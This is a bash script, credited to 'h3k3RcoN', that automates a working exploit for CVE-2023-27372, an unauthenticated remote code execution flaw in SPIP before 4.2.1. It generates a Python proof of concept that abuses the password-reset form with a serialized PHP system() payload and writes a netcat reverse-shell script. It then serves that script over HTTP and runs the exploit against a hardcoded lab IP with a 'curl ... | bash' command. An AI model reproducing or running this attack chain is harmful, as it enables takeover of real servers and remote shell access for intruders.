#!/bin/bash

echo "#########################"
echo "#   Built by h3k3RcoN   #"
echo "#########################"

echo -e "\033[31m[*] Remember to set a reverse shell listener first: nc -nvlp <PORT>\033[0m"

read -p "Press <enter>  to continue"
sleep 0.2

echo 

read -p "Enter the attacker IP (LHOST): " LHOST
read -p "Enter the desired port for the reverse shell (LPORT): " LPORT

HTTP_PORT=$((RANDOM % 999 + 8001))

echo "[*] Starting HTTP server on port $HTTP_PORT..."
python3 -m http.server $HTTP_PORT & 
HTTP_SERVER_PID=$!
sleep 1

# Cleanup function to remove generated files
cleanup() {
    echo "[*] Done"
    rm -f exploit.py shell.sh
    kill $HTTP_SERVER_PID
}

# Trap to clean up on exit (whether normal or interrupted)
trap cleanup EXIT

cat <<EOF > exploit.py
#!/usr/bin/env python3
import argparse
import bs4
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by h3k3RcoN")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    csrf = get_anticsrf(url=options.url)
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
EOF

chmod +x exploit.py

sleep 0.5

cat <<EOF > shell.sh
#!/bin/bash
nc -e /bin/bash $LHOST $LPORT
EOF

chmod +x shell.sh

sleep 0.5

echo "[*] Running exploit.py..."
python3 exploit.py -u http://10.0.160.240 -c "curl http://$LHOST:$HTTP_PORT/shell.sh | bash" -v

